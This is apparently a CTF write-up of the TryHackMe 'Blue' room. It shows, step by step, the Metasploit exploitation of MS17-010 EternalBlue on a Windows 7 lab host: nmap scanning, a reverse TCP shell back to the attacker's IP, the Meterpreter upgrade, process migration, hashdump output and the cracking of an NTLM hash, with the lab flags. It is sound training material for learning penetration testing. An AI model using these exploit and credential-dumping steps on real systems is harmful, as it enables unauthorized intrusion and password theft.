# TryHackMe — Blue Room Writeup
> **Date:** March 2026  
> **Difficulty:** Easy  
> **OS:** Windows 7  
> **Category:** Exploitation  

---

## Summary

This room covers exploitation of the famous **MS17-010 EternalBlue** vulnerability on a Windows 7 machine. We perform reconnaissance, exploit the vulnerability, escalate privileges, dump password hashes, crack them, and find 3 hidden flags.

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Finding the Exploit](#2-finding-the-exploit)
3. [Setting Up the Exploit](#3-setting-up-the-exploit)
4. [Getting a Shell](#4-getting-a-shell)
5. [Upgrading to Meterpreter](#5-upgrading-to-meterpreter)
6. [Process Migration](#6-process-migration)
7. [Dumping Password Hashes](#7-dumping-password-hashes)
8. [Cracking the Hash](#8-cracking-the-hash)
9. [Finding the Flags](#9-finding-the-flags)

---

## 1. Reconnaissance

Started with a full nmap scan to identify open ports, services, and vulnerabilities:

```bash
sudo nmap -sV -O -sC --script vuln 10.128.175.93
```

### Results

| Port | State | Service | Version |
|------|-------|---------|---------|
| 135 | open | msrpc | Microsoft Windows RPC |
| 139 | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | open | microsoft-ds | Windows 7 - 10 |
| 3389 | open | ssl/ms-wbt-server | RDP |

### Vulnerabilities Detected

- **CVE-2012-0152** — MS12-020 RDP Denial of Service (Medium)
- **CVE-2012-0002** — MS12-020 RDP Remote Code Execution (High)
- **MS17-010** — EternalBlue (confirmed via auxiliary scanner)

---

## 2. Finding the Exploit

Searched for MS17-010 modules in Metasploit:

```bash
msfconsole
search ms17-010
```

Selected module:
```
exploit/windows/smb/ms17_010_eternalblue
```

---

## 3. Setting Up the Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.128.175.93
set LHOST 192.168.134.226  # tun0 VPN interface
set PAYLOAD windows/x64/shell/reverse_tcp
```

> **Note:** Always use your `tun0` IP as LHOST on TryHackMe, not your local network IP.

---

## 4. Getting a Shell

```bash
run
```

### Output
```
[+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
[+] ETERNALBLUE overwrite completed successfully!
[*] Command shell session 1 opened
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

---

## 5. Upgrading to Meterpreter

A basic shell is limited. Upgraded to Meterpreter for full capabilities:

```bash
# Background the shell
CTRL + Z

# Upgrade session
sessions -u 1

# Interact with new Meterpreter session
sessions -i 2

# Verify privileges
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 6. Process Migration

Migrated to a stable SYSTEM process for persistence:

```bash
meterpreter > ps
# Found: spoolsv.exe (PID 1288) running as NT AUTHORITY\SYSTEM

meterpreter > migrate 1288
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 7. Dumping Password Hashes

```bash
meterpreter > hashdump
```

### Results
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

## 8. Cracking the Hash

Used **CrackStation** (`crackstation.net`) to crack Jon's NTLM hash:

| Hash | Type | Password |
|------|------|----------|
| ffb43f0de35be4d9917ac0cc8ad57f8d | NTLM | **alqfna22** |

---

## 9. Finding the Flags

### Flag 1 — Root of C drive
```bash
meterpreter > cat C:\\flag1.txt
flag{access_the_machine}
```

### Flag 2 — SAM database location
```bash
meterpreter > cat C:\\Windows\\System32\\config\\flag2.txt
flag{sam_database_elevated_access}
```

### Flag 3 — Jon's Documents
```bash
meterpreter > cat C:\\Users\\Jon\\Documents\\flag3.txt
flag{admin_documents_can_be_valuable}
```

---

## What I Learned

- How to use nmap with vulnerability scripts (`--script vuln`)
- How EternalBlue (MS17-010) works and why it's so powerful
- How to upgrade a basic shell to a Meterpreter session
- How to migrate between processes in Meterpreter
- How to dump and crack Windows NTLM password hashes
- Always use `tun0` IP as LHOST on TryHackMe

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Reconnaissance and vulnerability scanning |
| Metasploit | Exploitation framework |
| Meterpreter | Post-exploitation |
| CrackStation | NTLM hash cracking |
